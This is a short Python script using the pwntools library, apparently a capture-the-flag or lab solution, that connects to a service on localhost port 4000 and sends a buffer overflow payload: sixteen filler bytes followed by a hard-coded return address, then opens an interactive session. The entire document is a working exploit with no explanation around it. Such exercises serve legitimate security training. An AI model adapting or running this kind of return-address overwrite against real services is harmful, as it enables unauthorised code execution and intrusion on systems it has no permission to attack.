from pwn import *

p = remote("localhost", 4000)

payload = b"A"*16 + b"\x46\x11\x40\x00" + b"\x00" * 4

p.sendline(payload)
p.interactive()